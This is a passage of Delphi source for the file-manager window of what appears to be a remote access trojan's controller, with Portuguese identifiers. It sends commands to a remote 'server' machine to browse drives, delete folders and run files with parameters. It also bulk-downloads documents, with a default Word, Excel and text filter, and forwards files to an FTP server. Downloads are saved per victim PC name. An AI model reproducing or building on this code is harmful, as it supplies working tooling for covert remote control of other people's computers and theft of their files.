    DirList.Insert(DirListPosition, LastComBoxText);

    BitBtnback.Enabled := DirListPosition > 0;
    BitBtnForward.Enabled := DirListPosition < DirList.Count - 1;
    BitBtnUp.Enabled := StringCount(ComboBox1.Text, '\') >= 2;
  end;
end;

procedure TFormFileManager.ComboBox1KeyPress(Sender: TObject; var Key: Char);
begin
  if key = #13 then
  begin
    IniciarListagem(ComboBox1.Text);
    ComboBox1.SetFocus;
    ComboBox1.SelLength := Length(ComboBox1.Text);
  end else
  if key = '|' then key := #0;
end;

procedure TFormFileManager.ListView1ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to Listview1.Columns.Count -1 do Listview1.Column[i].ImageIndex := -1;
  LastSortedColumn := Column;
  Listview1.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormFileManager.ListView1DblClick(Sender: TObject);
var
  TempFile: string;
begin
  if Listview1.SelCount = 1 then
  begin
    if (ListView1.Selected.SubItems.Objects[0] = nil) and
       (ListView1.Selected.SubItems.Strings[0] = '') then
    begin
      LastUploadFolder := ComboBox1.Text;
      IniciarListagem(LastUploadFolder);
    end else
    begin
      TempFile :=  TFileDados(ListView1.Selected.Data).FileName;
      if IsImageFile(TempFile) = true then
      Servidor.EnviarString(FMTHUMBS2 + '|' + inttostr(ThumbSize * 3) + '|' + inttostr(ThumbQuality) + '|' + TempFile);
    end;
  end;
end;

procedure TFormFileManager.ListView1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if ListView1.Selected <> nil then
  if key = VK_DELETE then Deletar2Click(Deletar2);
end;

procedure TFormFileManager.ListView1SelectItem(Sender: TObject; Item: TListItem;
  Selected: Boolean);
begin
  if Selected = True then
  if Item <> nil then
  if ListView1.SelCount = 1 then
  begin
    if (Item.SubItems.Objects[0] = nil) and (Item.SubItems.strings[0] = '') then
    begin
      ComboBox1.Text := TDirDados(Item.Data).Info + '\';
      Statusbar1.Panels.Items[0].Text := TDirDados(Item.SubItems.Objects[3]).Info;
    end else
    begin
      ComboBox1.Text := ExtractFilePath(TFileDados(Item.Data).FileName);
      Statusbar1.Panels.Items[0].Text := ListView1.Column[0].Caption + ': ' +
                                         Item.Caption + ' --- ' +
                                         ListView1.Column[1].Caption + ': ' +
                                         Item.SubItems.Strings[0];
    end;
  end;
  Edit2.Text := ComboBox1.Text;
end;

procedure TFormFileManager.ListView2ColumnClick(Sender: TObject;
  Column: TListColumn);
var
  i: integer;
begin
  Ascending := not Ascending;
  if Column <> LastSortedColumn then Ascending := not Ascending;
  for i := 0 to Listview2.Columns.Count -1 do Listview2.Column[i].ImageIndex := -1;
  LastSortedColumn := Column;
  Listview2.CustomSort(@SortByColumn, LastSortedColumn.Index);
end;

procedure TFormFileManager.ListView2DblClick(Sender: TObject);
var
  TempFile: string;
begin
  if ListView2.Selected = nil then Exit;

  TempFile := ListView2.Selected.Caption;
  if IsImageFile(TempFile) = true then
  Servidor.EnviarString(FMTHUMBS2 + '|' + inttostr(ThumbSize * 3) + '|' + inttostr(ThumbQuality) + '|' + TempFile);
end;

procedure TFormFileManager.ListView2KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
  if ListView2.Selected <> nil then
  if key = VK_DELETE then Deletar3Click(Deletar3);
end;

procedure TFormFileManager.Definircomopapeldeparede1Click(Sender: TObject);
begin
  Servidor.EnviarString(FMWALLPAPER + '|' +
               TFileDados(ListView1.Selected.Data).FileName);
end;

procedure TFormFileManager.Definircomopapeldeparede2Click(Sender: TObject);
begin
  Servidor.EnviarString(FMWALLPAPER + '|' + ListView2.Selected.Caption);
end;

procedure TFormFileManager.Definirtamanho1Click(Sender: TObject);
var
  strSize: string;
  Size: integer;
begin
  strSize := IntToStr(ThumbSize);
  if InputQuery(traduzidos[308],
                traduzidos[309] + ' (default: 90)'+ ':',
                strSize) then
  begin
    try
      Size := StrToInt(StrSize);
      except
      exit;
    end;
    if Size > 0 then ThumbSize := Size;
  end;
end;

procedure TFormFileManager.Deletar1Click(Sender: TObject);
begin
  SelectedNode[NodeAtual] := Treeview1.Selected;

  if MessageBox(Handle,
                pwidechar(GetFullPath(Treeview1.Selected) + #13#10 + traduzidos[356]),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  Servidor.EnviarString(FMDELETARPASTA + '|' + IntToStr(NodeAtual) + '|' +
               GetFullPath(TreeView1.Selected) + delimitadorComandos);
  statusbar1.Panels.Items[0].Text := traduzidos[205];
  inc(NodeAtual);
end;

procedure TFormFileManager.ApplicationEvents1Message(var Msg: tagMSG;
  var Handled: Boolean);
var
  Recebido: string;
  s: integer;
  Stream: TMemoryStream;
  JPG: TJpegImage;
  BMP: TBitmap;
  Tempint: Int64;
  TempStr: string;
begin
  if Msg.message = WM_GETIMAGE then
  begin
    if FormFMPreview.Visible = True then Exit;

    s := integer(Msg.wParam);
    setlength(Recebido, s div 2);
    copymemory(@Recebido[1], pointer(Msg.lparam), s);
    VirtualFree(pointer(Msg.lparam), 0, MEM_RELEASE);

    delete(Recebido, 1, posex('|', Recebido));
    Tempint := StrToInt(Copy(Recebido, 1, posex('|', Recebido) - 1));
    delete(Recebido, 1, posex('|', Recebido));
    TempStr := Copy(Recebido, 1, posex('|', Recebido) - 1);
    delete(Recebido, 1, posex('|', Recebido));
    if Recebido = '' then exit;

    Stream := TMemoryStream.Create;
    Stream.WriteBuffer(Recebido[1], length(Recebido) * 2);
    Stream.Position := 0;
    JPG := TJpegImage.Create;
    try
      JPG.LoadFromStream(Stream);
      except
      JPG.Free;
      Stream.Free;
      exit;
    end;
    Stream.Free;
    BMP := TBitmap.Create;
    BMP.Width := JPG.Width;
    BMP.Height := JPG.Height;
    BMP.Canvas.Draw(0, 0, JPG);
    JPG.Free;

    try
      FormFMPreview.Caption := '';
      FormFMPreview.Width := Tempint;
      FormFMPreview.Height := Tempint;
      FormFMPreview.Image1.Hint := ExtractFileName(TempStr);
      FormFMPreview.Image1.Picture.Assign(BMP);
      BMP.Free;
      FormFMPreview.ShowModal;
      finally
      FormFMPreview.Image1.Picture.Bitmap := nil;
    end;

  end;
end;

procedure TFormFileManager.Excluir1Click(Sender: TObject);
begin
  ExcluirTransferencia;
end;

procedure TFormFileManager.Executar1Click(Sender: TObject);
var
  Form: TFormExecParam;
  Param: string;
  ExecType: integer;
  FileName: string;
begin
  Form := TFormExecParam.create(application);
  try
    Form.Caption := traduzidos[316];
    Form.Edit1.Clear;

    if Form.ShowModal = mrOK then
    begin
      FileName := TFileDados(ListView1.Selected.Data).FileName + delimitadorComandos;
      Exectype := Form.bsSkinRadioGroup1.ItemIndex;
      Param := Form.Edit1.Text + delimitadorComandos;
      Servidor.enviarString(
                   FMEXECPARAM + '|' +
                   IntToStr(ExecType) + '|' +
                   FileName +
                   Param);
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;

procedure TFormFileManager.Executar3Click(Sender: TObject);
var
  Form: TFormExecParam;
  Param: string;
  ExecType: integer;
  FileName: string;
begin
  Form := TFormExecParam.create(application);
  try
    Form.Caption := traduzidos[316];
    Form.Edit1.Clear;

    if Form.ShowModal = mrOK then
    begin
      FileName := ListView2.Selected.Caption + delimitadorComandos;
      Exectype := Form.bsSkinRadioGroup1.ItemIndex;
      Param := Form.Edit1.Text + delimitadorComandos;
      Servidor.enviarString(
                   FMEXECPARAM + '|' +
                   IntToStr(ExecType) + '|' +
                   FileName +
                   Param);
    end;
    finally
    Form.Release;
    Form := nil;
  end;
end;

procedure TFormFileManager.FormClose(Sender: TObject; var Action: TCloseAction);
var
  TempStr: WideString;
  IniFile: TIniFile;
  Node: pVirtualNode;
  TransferInfo: pConexaoNew;
begin
  if LiberarForm then Action := caFree;

  PossoBaixarPasta := False;
  ListaArquivosPasta := '';
  OneByOneList := '';

  if Assigned(FormDownloadAll) = True then
  if FormDownloadAll.Visible then FormDownloadAll.Close;

  if FormFMPreview <> nil then
  if FormFMPreview.Visible then FormFMPreview.Close;

  TempStr := ExtractFilePath(ParamStr(0)) + 'Settings\';
  ForceDirectories(TempStr);
  TempStr := TempStr + NomePC + '.ini';

  try
    IniFile := TIniFile.Create(TempStr, IniFilePassword);
    IniFile.WriteInteger('FileManager', 'Width', Width);
    IniFile.WriteInteger('FileManager', 'Height', Height);
    IniFile.WriteInteger('FileManager', 'Left', Left);
    IniFile.WriteInteger('FileManager', 'Top', Top);

    IniFile.WriteString('FileManager', 'FTPAddress', UnicodeToAnsi(LastFTPAddress, CP_UTF8, False));
    IniFile.WriteString('FileManager', 'FTPFolder', UnicodeToAnsi(LastFTPFolder, CP_UTF8, False));
    IniFile.WriteString('FileManager', 'FTPUser', UnicodeToAnsi(LastFTPUser, CP_UTF8, False));
    IniFile.WriteString('FileManager', 'FTPPass', UnicodeToAnsi(LastFTPPass, CP_UTF8, False));

    IniFile.WriteInteger('FileManager', 'LV1_0', ListView1.Column[0].Width);
    IniFile.WriteInteger('FileManager', 'LV1_1', ListView1.Column[1].Width);
    IniFile.WriteInteger('FileManager', 'LV1_2', ListView1.Column[2].Width);
    IniFile.WriteInteger('FileManager', 'LV1_3', ListView1.Column[3].Width);
    IniFile.WriteInteger('FileManager', 'LV1_4', ListView1.Column[4].Width);
    IniFile.WriteInteger('FileManager', 'WP1', Panel2.Width);
    IniFile.WriteInteger('FileManager', 'LV2_0', ListView2.Column[0].Width);
    IniFile.WriteInteger('FileManager', 'LV2_1', ListView2.Column[1].Width);
    IniFile.WriteInteger('FileManager', 'LV2_2', ListView2.Column[2].Width);
    IniFile.WriteInteger('FileManager', 'LV2_3', ListView2.Column[3].Width);
    IniFile.WriteInteger('FileManager', 'LV2_4', ListView2.Column[4].Width);

    IniFile.WriteInteger('FileManager', 'LV3_0', VirtualStringTree1.Header.Columns.Items[0].Width);
    IniFile.WriteInteger('FileManager', 'LV3_1', VirtualStringTree1.Header.Columns.Items[1].Width);
    IniFile.WriteInteger('FileManager', 'LV3_2', VirtualStringTree1.Header.Columns.Items[2].Width);
    IniFile.WriteInteger('FileManager', 'LV3_3', VirtualStringTree1.Header.Columns.Items[3].Width);
    IniFile.WriteInteger('FileManager', 'LV3_4', VirtualStringTree1.Header.Columns.Items[4].Width);
    IniFile.WriteInteger('FileManager', 'LV3_4', VirtualStringTree1.Header.Columns.Items[5].Width);
    IniFile.Free;
    except
    DeleteFile(TempStr);
  end;

  if Servidor = nil then exit;
  if Servidor.MasterIdentification <> 1234567890 then Exit;

  if VirtualStringTree1.TotalCount > 0 then
  begin
    Node := VirtualStringTree1.GetFirst;
    while Assigned(Node) do
    begin
      TransferInfo := VirtualStringTree1.GetNodeData(Node);
      if Assigned(TransferInfo) then
      begin
        if TransferInfo^.Transfer_IsDownload then
        PararTransferencia(Node) else
        ExcluirTransferencia(False);
      end;
      Node := VirtualStringTree1.GetNext(Node);
    end;
  end;
end;

procedure TFormFileManager.FormShow(Sender: TObject);
var
  TempStr: string;
begin
  PossoBaixarPasta := False;
  ListaArquivosPasta := '';
  OneByOneList := '';
  ToCopy := '';

  ComboBox1.Text := '';

  FMTHUMBS_SEARCH_STARTED := false;
  FMTHUMBS_STARTED := false;
  FMFILELIST_STARTED := false;
  FMFILESEARCHLIST_STARTED := false;
  FMFOLDERLIST_STARTED := false;

  AtualizarIdiomas;

  ZeroMemory(@SelectedNode, Sizeof(SelectedNode));
  NodeAtual := 1;

  PageControl1.TabIndex := 0;

  if IncompletosCarregados = false then
  begin
    LoadIncompletes;
    IncompletosCarregados := True;
  end;

  if FirstTime = True then
  begin
    FirstTime := False;
   	AtualizarAutomaticamente1click(nil);
  end;

  DownloadAllFile := ExtractFilePath(paramstr(0)) + 'Downloads\' + NomePC + '\DownloadAll.xtr';
  ForceDirectories(ExtractFilePath(DownloadAllFile));
  if FileExists(DownloadAllFile) then Button3.Caption := Traduzidos[194] else
    Button3.Caption := Traduzidos[328];
  Button3.Enabled := True;

  UnRAR1.Visible := False;
  RAR1.Visible := False;
  if Servidor.RARPlugin = False then Servidor.EnviarString(FMCHECKRAR + '|') else
  begin
    UnRAR1.Visible := True;
    RAR1.Visible := True;
  end;
end;

procedure TFormFileManager.Todasjuntas1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
  RemoteFileName: string;
  Transfer: TConexaoNew;
begin
  TempStr := '';

  for i := 0 to ListView1.Items.Count - 1 do
  if (ListView1.Items.Item[i].Selected = true) and
     (ListView1.Items.Item[i].SubItems.Objects[0] <> nil) and
     (ListView1.Items.Item[i].SubItems.strings[0] <> '') then
  begin
    if Int64(ListView1.Items.Item[i].SubItems.Objects[0]) <= 0 then Continue;
    if CheckDownloadList(TFileDados(ListView1.Items.Item[i].Data).FileName) = false then
    TempStr := TempStr + TFileDados(ListView1.Items.Item[i].Data).FileName + delimitadorcomandos;
  end;

  if TempStr = '' then Exit;

  while TempStr <> '' do
  begin
    RemoteFileName := Copy(TempStr, 1, posex(delimitadorcomandos, TempStr) - 1);
    delete(TempStr, 1, posex(delimitadorcomandos, TempStr) - 1);
    delete(TempStr, 1, length(delimitadorcomandos));

    Transfer := TConexaoNew.Create(nil, nil);
    Transfer.CreateTransfer(RemoteFileName, '', 0, 0, True, VirtualStringTree1);

    Servidor.EnviarString(FMDOWNLOAD + '|' + RemoteFileName);

    sleep(100);
    Application.ProcessMessages;
  end;
  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.Todasjuntas2Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
  RemoteFileName: string;
  Transfer: TConexaoNew;
begin
  TempStr := '';

  for i := 0 to ListView2.Items.Count - 1 do
  if ListView2.Items.Item[i].Selected = true then
  begin
    if CheckDownloadList(ListView2.Items.Item[i].Caption) = false then
    TempStr := TempStr + ListView2.Items.Item[i].Caption + delimitadorcomandos;
  end;

  if TempStr = '' then Exit;

  while TempStr <> '' do
  begin
    RemoteFileName := Copy(TempStr, 1, posex(delimitadorcomandos, TempStr) - 1);
    delete(TempStr, 1, posex(delimitadorcomandos, TempStr) - 1);
    delete(TempStr, 1, length(delimitadorcomandos));

    Transfer := TConexaoNew.Create(nil, nil);
    Transfer.CreateTransfer(RemoteFileName, '', 0, 0, True, VirtualStringTree1);

    Servidor.EnviarString(FMDOWNLOAD + '|' + RemoteFileName);
    sleep(100);
    Application.ProcessMessages;
  end;
  statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.TreeView1Click(Sender: TObject);
var
  node: TTreeNode;
begin
  Statusbar1.Panels.Items[0].Text := '';
  node := Treeview1.Selected;
  if node = nil then exit;
  if Treeview1.Selected.Data <> nil then
    Statusbar1.Panels.Items[0].Text := TDirDados(Treeview1.Selected.Data).Info else
    Statusbar1.Panels.Items[0].Text := '';
  Edit2.Text := getfullpath(node);
  ComboBox1.Text := getfullpath(node);
end;

procedure TFormFileManager.TreeView1DblClick(Sender: TObject);
begin
  if Treeview1.Selected = nil then exit;
  if Treeview1.Selected.Text = traduzidos[280] then Exit;
  if Treeview1.Selected.Text = traduzidos[308] then Exit;

  if Prviadasimagens1.Checked = true then
  begin
    if FMTHUMBS_STARTED = true then
    begin
      FMTHUMBS_STARTED := false;
      ListView1.Items.EndUpdate;
    end;

    //ListView1.Items.Clear;
    ListView1.LargeImages := ImageListListView;
    ListView1.SmallImages := ImageListListView;
    Prviadasimagens1.Checked := false;
    Servidor.EnviarString(FMTHUMBS + '|'); // se houver uma thread ativa, ela irá ser finalizada
    //if FMFILELIST_STARTED = false then ListView1.Items.Clear;
  end;

  EnviarListarDir(Treeview1.Selected);
end;

procedure TFormFileManager.Upload1Click(Sender: TObject);
var
  LocalFileName, TempFolder, RemoteFileName: string;
  LocalFileSize: int64;
  Transfer: TConexaoNew;
  AStream: TFileStream;
begin
  TempFolder := LastUploadFolder;

  if MessageBox(Handle,
                pwidechar(Traduzidos[391] + ': ' + TempFolder + #13#10 + traduzidos[135] + '?'),
                pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
                MB_YESNO or MB_ICONQUESTION or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST) <> idYes then exit;

  if opendialog1 <> nil then opendialog1.Free;
  OpenDialog1 := TOpenDialog.Create(nil);
  opendialog1.Filter := 'All Files (*.*)' + '|*.*';
  opendialog1.InitialDir := ExtractFilePath(paramstr(0));
  opendialog1.Title := NomeDoPrograma + ' ' + VersaoDoPrograma;
  if opendialog1.Execute = false then exit;

  LocalFileName := Opendialog1.FileName;
  RemoteFileName := TempFolder + extractFileName(LocalFileName);

  if CheckDownloadList(RemoteFileName) = True then exit;

  if PossoMexer(LocalFileName) = false then
  begin
    MessageBox(Handle,
               pwidechar(traduzidos[392]),
               pWideChar(NomeDoPrograma + ' ' + VersaoDoPrograma),
               MB_OK or MB_ICONWARNING or MB_SYSTEMMODAL or MB_SETFOREGROUND or MB_TOPMOST);
    exit;
  end;

  AStream := TFileStream.Create(LocalFileName, fmOpenRead + fmShareDenyNone);
  LocalFileSize := AStream.Size;
  FreeAndNil(AStream);

  if LocalFileSize <= 0 then Exit;

  Transfer := TConexaoNew.Create(nil, nil);
  Transfer.CreateTransfer(RemoteFileName, LocalFileName, 0, LocalFileSize, False, VirtualStringTree1);

  Servidor.EnviarString(FMUPLOAD + '|' + RemoteFileName + DelimitadorComandos + IntToStr(LocalFileSize));
end;

procedure TFormFileManager.UploadFTP1Click(Sender: TObject);
var
  i: integer;
  FormFTPSettings: TFormFTPSettings;
  FTPAddress, FTPFolder, FTPUser, FTPPass, TempStr: WideString;
begin
  application.ProcessMessages;

  FTPAddress := LastFTPAddress;
  FTPFolder := LastFTPFolder;
  FTPUser := LastFTPUser;
  FTPPass := LastFTPPass;

  try
    FormFTPSettings := TFormFTPSettings.Create(Application);
    FormFTPSettings.Edit1.Text := FTPAddress;
    FormFTPSettings.Edit2.Text := FTPFolder;
    FormFTPSettings.Edit3.Text := FTPUser;
    FormFTPSettings.Edit4.Text := FTPPass;

    FormFTPSettings.Caption := Traduzidos[335];
    FormFTPSettings.Label1.caption := traduzidos[69] + ':';
    FormFTPSettings.Label3.caption := traduzidos[31] + ':';
    FormFTPSettings.Label4.caption := traduzidos[70] + ':';
    FormFTPSettings.Label5.caption := traduzidos[72] + ':';
    FormFTPSettings.Button2.Caption := Traduzidos[120];

    if FormFTPSettings.ShowModal = mrOK then
    begin
      FTPAddress := FormFTPSettings.Edit1.Text;
      FTPFolder := FormFTPSettings.Edit2.Text;
      FTPUser := FormFTPSettings.Edit3.Text;
      FTPPass := FormFTPSettings.Edit4.Text;
    end else
    begin
      FTPAddress := '';
      FTPFolder := '';
      FTPUser := '';
      FTPPass := '';
    end;
    finally
    FormFTPSettings.Release;
    FormFTPSettings := nil;
  end;

  if (FTPAddress = '') or (FTPUser = '') then exit;

  LastFTPAddress := FTPAddress;
  LastFTPFolder := FTPFolder;
  LastFTPUser := FTPUser;
  LastFTPPass := FTPPass;

  TempStr := TFileDados(ListView1.Selected.Data).FileName;

  TempStr := FTPAddress + DelimitadorComandos +
             './' + FTPFolder + DelimitadorComandos +
             FTPUser + DelimitadorComandos +
             LastFTPPass + DelimitadorComandos +
             TempStr;

  Servidor.EnviarString(FMSENDFTP + '|' + TempStr);
  Statusbar1.Panels.Items[0].Text := traduzidos[205];
end;

procedure TFormFileManager.VirtualStringTree1GetImageIndex(
  Sender: TBaseVirtualTree; Node: PVirtualNode; Kind: TVTImageKind;
  Column: TColumnIndex; var Ghosted: Boolean; var ImageIndex: Integer);
var
  NodePosition: integer;
  TransferInfo: pConexaoNew;
begin
  if not (Kind in [ikNormal, ikSelected]) then Exit;

  TransferInfo := Sender.GetNodeData(Node);

  case Column of
    0:
       begin
         if TransferInfo^.Transfer_Status = Traduzidos[127] {baixando}then
         ImageIndex := 8 else
         if TransferInfo^.Transfer_Status = Traduzidos[130] {enviando}then
         ImageIndex := 9 else
         if TransferInfo^.Transfer_Status = Traduzidos[128] {finalizado}then
         ImageIndex := 6 else
         if TransferInfo^.Transfer_Status = Traduzidos[129] {parado}then
         ImageIndex := 22 else ImageIndex := -1;
       end;
    1: ImageIndex := -1;
    2: ImageIndex := -1;
    3: ImageIndex := -1;
    4: ImageIndex := -1;
    5: ImageIndex := -1;
  end;
end;

procedure TFormFileManager.VirtualStringTree1GetNodeDataSize(
  Sender: TBaseVirtualTree; var NodeDataSize: Integer);
begin
  NodeDataSize := UnitConexao.NewNodeSize;
end;

procedure TFormFileManager.VirtualStringTree1GetText(Sender: TBaseVirtualTree;
  Node: PVirtualNode; Column: TColumnIndex; TextType: TVSTTextType;
  var CellText: string);
var
  NodePosition: integer;
  TransferInfo: pConexaoNew;
begin
  TransferInfo := Sender.GetNodeData(Node);

  case Column of
    0: CellText := ExtractFileName(TransferInfo^.Transfer_RemoteFileName);
    1: CellText := TransferInfo^.Transfer_RemoteFileSize_string;
    2: CellText := TransferInfo^.Transfer_Status;
    3: CellText := TransferInfo^.Transfer_TransferPosition_string;
    4: CellText := TransferInfo^.Transfer_Velocidade;
    5: CellText := TransferInfo^.Transfer_TempoRestante;
  end;

end;

procedure TFormFileManager.VirtualStringTree1PaintText(Sender: TBaseVirtualTree;
  const TargetCanvas: TCanvas; Node: PVirtualNode; Column: TColumnIndex;
  TextType: TVSTTextType);
begin
  //AtualizarQuantidade;
end;

procedure TFormFileManager.Abrirpastadedownloads1Click(Sender: TObject);
var
  TempDir: string;
begin
  TempDir := ExtractFilePath(paramstr(0)) + 'Downloads\' + NomePC;
  ForceDirectories(TempDir);
  ShellExecute(0,
               'open',
               'explorer.exe',
               pchar(tempdir),
               '',
               SW_NORMAL);
end;

procedure TFormFileManager.Atualizarautomaticamente1Click(Sender: TObject);
begin
  TreeView1.Items.Item[0].DeleteChildren;
  while TreeView1.Items.Count > 1 do TreeView1.Items.Item[1].Delete;

  if SharedDrive <> nil then SharedDrive.Delete;
  SharedDrive := nil;

  if ListView1.Items.Count > 0 then ListView1.Items.Clear;
  TreeView1.Enabled := false;
  ListView1.Enabled := false;
  Servidor.EnviarString(FMDRIVELIST + '|');
  Statusbar1.Panels.Items[0].Text := traduzidos[205];
  Atualizarautomaticamente1.Checked := false;
end;

procedure TFormFileManager.AtualizarIdiomas;
begin
  TreeView1.Items.Item[0].Text := traduzidos[280];
  if SharedDrive <> nil then SharedDrive.Text := traduzidos[308];
  ListView1.Column[0].Caption := traduzidos[282];
  ListView1.Column[1].Caption := traduzidos[158];
  ListView1.Column[2].Caption := traduzidos[212];
  ListView1.Column[3].Caption := traduzidos[283];
  ListView1.Column[4].Caption := traduzidos[310];
  Novapasta1.Caption := traduzidos[311];
  Deletar1.Caption := traduzidos[312];
  Moverparalixeira1.Caption := traduzidos[313];
  Renomear1.Caption := traduzidos[169];
  Atualizarautomaticamente1.Caption := traduzidos[314];
  Executar2.Caption := traduzidos[315];
  Executar1.Caption := traduzidos[316];
  Deletar2.Caption := traduzidos[312];
  Moverparalixeira2.Caption := traduzidos[313];
  Editar1.Caption := traduzidos[265];
  Normal1.Caption := traduzidos[317];
  Oculto1.Caption := traduzidos[318];
  Definircomopapeldeparede1.Caption := traduzidos[319];
  Abrirpastadedownloads1.Caption := traduzidos[183];
  TabSheet1.Caption := traduzidos[320];
  TabSheet2.Caption := traduzidos[321];
  Download1.Caption := traduzidos[322];
  Upload1.Caption := traduzidos[323];
  UploadFTP1.Caption := traduzidos[324];
  Prviadasimagens1.Caption := traduzidos[325];
  TabSheet3.Caption := traduzidos[326];
  Edit1.EditLabel.Caption := traduzidos[49];
  Edit2.EditLabel.Caption := traduzidos[51];
  CheckBox1.Caption := traduzidos[327];
  Button1.Caption := traduzidos[328];
  Button2.Caption := traduzidos[329];
  Button3.Caption := traduzidos[328];
  ListView2.Column[0].Caption := traduzidos[282];
  ListView2.Column[1].Caption := traduzidos[158];
  ListView2.Column[2].Caption := traduzidos[212];
  ListView2.Column[3].Caption := traduzidos[283];
  ListView2.Column[4].Caption := traduzidos[310];
  Abrirpastadedownloads2.Caption := traduzidos[183];
  Executar4.Caption := traduzidos[315];
  Executar3.Caption := traduzidos[316];
  Editar2.Caption := traduzidos[265];
  Normal2.Caption := traduzidos[317];
  Oculto2.Caption := traduzidos[318];
  Definircomopapeldeparede2.Caption := traduzidos[319];
  Deletar3.Caption := traduzidos[312];
  Moverparalixeira3.Caption := traduzidos[313];
  Prviadasimagens2.Caption := traduzidos[325];
  DefinirTamanho1.Caption := traduzidos[330];
  DefinirTamanho2.Caption := traduzidos[330];
  Iniciar1.Caption := traduzidos[328];
  Iniciar2.Caption := traduzidos[328];
  VirtualStringTree1.Header.Columns.Items[0].Text := traduzidos[49];
  VirtualStringTree1.Header.Columns.Items[1].Text := traduzidos[158];
  VirtualStringTree1.Header.Columns.Items[2].Text := traduzidos[331];
  VirtualStringTree1.Header.Columns.Items[3].Text := traduzidos[332];
  VirtualStringTree1.Header.Columns.Items[4].Text := traduzidos[333];
  VirtualStringTree1.Header.Columns.Items[5].Text := traduzidos[334];
  Iniciar3.Caption := traduzidos[328];
  Parar1.Caption := traduzidos[329];
  Excluir1.Caption := traduzidos[287];
  Abrirpastadedownloads3.Caption := traduzidos[183];
  DownloadFolder1.Caption := Traduzidos[566];
  DownloadFolder2.Caption := Traduzidos[566];
  if SpecialNode <> nil then SpecialNode.Text := traduzidos[309];
  ListView1.Hint := Traduzidos[339];
  ListView2.Hint := Traduzidos[339];

  Todasjuntas1.Caption := traduzidos[584];
  Umarquivoporvez1.Caption := traduzidos[585];
  Label1.Caption := traduzidos[624];
end;

procedure TFormFileManager.Button1Click(Sender: TObject);
var
  SelectedDir: string;
  TempStr: string;
begin
  SelectedDir := Edit2.Text;
  if SelectedDir = '' then
  begin
    SelectedDir := 'C:\';
    Edit2.Text := SelectedDir;
  end;

  if Edit1.Text = '' then Edit1.Text := '*.*';

  if Prviadasimagens2.Checked = true then
  begin
    if FMTHUMBS_SEARCH_STARTED = true then
    begin
      FMTHUMBS_SEARCH_STARTED := false;
      ListView2.Items.EndUpdate;
    end;

    //ListView2.Items.Clear;
    ListView2.LargeImages := ImageListListView2;
    ListView2.SmallImages := ImageListListView2;
    Prviadasimagens2.Checked := false;
    Servidor.EnviarString(FMTHUMBS_SEARCH + '|'); // se houver uma thread ativa, ela irá ser finalizada
    sleep(100);
  end;

  Button1.Enabled := False;
  Button2.Enabled := true;

  if CheckBox1.Checked then TempStr := 'YES' else TempStr := 'NO';

  //ListView2.Items.Clear;
  if SelectedDir[length(SelectedDir)] <> '\' then SelectedDir := SelectedDir + '\';
  Servidor.EnviarString(FMFILESEARCHLIST + '|' + TempStr + '|' + SelectedDir + delimitadorComandos + Edit1.Text);
end;

procedure TFormFileManager.Button2Click(Sender: TObject);
begin
  Button1.Enabled := true;
  Button2.Enabled := false;
  Servidor.EnviarString(FMFILESEARCHLISTSTOP + '|');
end;

procedure TFormFileManager.Button3Click(Sender: TObject);
var
  MS: TMemoryStream;
  TempStr: string;
  DownloadAll: TRecDownloadAll;
begin
  FormDownloadAll.ListView2.Clear;
  FormDownloadAll.RadioGroup1.Enabled := True;
  FormDownloadAll.Edit1.Enabled := True;
  FormDownloadAll.Button1.Enabled := True;
  SendMessage(FormDownloadAll.Handle, 5556, cardinal(DownloadAllFile), 0);
  FormDownloadAll.sStatusBar1.Panels.Items[0].Text := '';
  FillChar(DownloadAll, SizeOf(DownloadAll), #0);

  if FileExists(DownloadAllFile) then
  begin
  try
    MS := TMemoryStream.Create;
    MS.LoadFromFile(DownloadAllFile);
    MS.Position := 0;
    MS.Read(DownloadAll, SizeOf(TRecDownloadAll));
    SetLength(TempStr, (MS.Size - MS.Position) div 2);
    MS.Read(TempStr[1], MS.Size);
  finally
   MS.Free;
  end;


    SendMessage(FormDownloadAll.Handle, 5557, cardinal(TempStr), 0);
    SendMessage(FormDownloadAll.Handle, 5558, cardinal(@DownloadAll), 0);
    Application.ProcessMessages;

    FormDownloadAll.LoadDownloadFiles;
    UpdateFileIcons(FormDownloadAll.ListView2);

    FormDownloadAll.RadioGroup1.ItemIndex := DownloadAll.Option;
    FormDownloadAll.Edit1.Clear;
    FormDownloadAll.Edit1.Text := DownloadAll.Filter;
    FormDownloadAll.RadioGroup1.Enabled := False;
    FormDownloadAll.Edit1.Enabled := False;
    FormDownloadAll.Button1.Enabled := False;

    if FormDownloadAll.Visible = True then FormDownloadAll.BringToFront else
    FormDownloadAll.Show;
  end else
  begin
    FormDownloadAll.Edit1.Text := '*.doc;*.docx;*.xls;*.xlsx;*.txt;*.rft;';
    FormDownloadAll.RadioGroup1.ItemIndex := 1;

    if FormDownloadAll.Visible = True then FormDownloadAll.BringToFront else
    FormDownloadAll.Show;
  end;
end;

procedure TFormFileManager.Umarquivoporvez1Click(Sender: TObject);
var
  i: integer;
  TempStr: string;
  RemoteFileName: string;
  Transfer: TConexaoNew;
begin
  TempStr := '';

  for i := 0 to ListView1.Items.Count - 1 do
  if (ListView1.Items.Item[i].Selected = true) and
     (ListView1.Items.Item[i].SubItems.Objects[0] <> nil) and
     (ListView1.Items.Item[i].SubItems.strings[0] <> '') then
  begin
    if Int64(ListView1.Items.Item[i].SubItems.Objects[0]) <= 0 then Continue;
    if CheckDownloadList(TFileDados(ListView1.Items.Item[i].Data).FileName) = false then
    TempStr := TempStr + TFileDados(ListView1.Items.Item[i].Data).FileName + delimitadorcomandos;
  end;

  if TempStr = '' then Exit;

  OneByOneList := OneByOneList + TempStr;

  RemoteFileName := Copy(OneByOneList, 1, posex(delimitadorcomandos, OneByOneList) - 1);
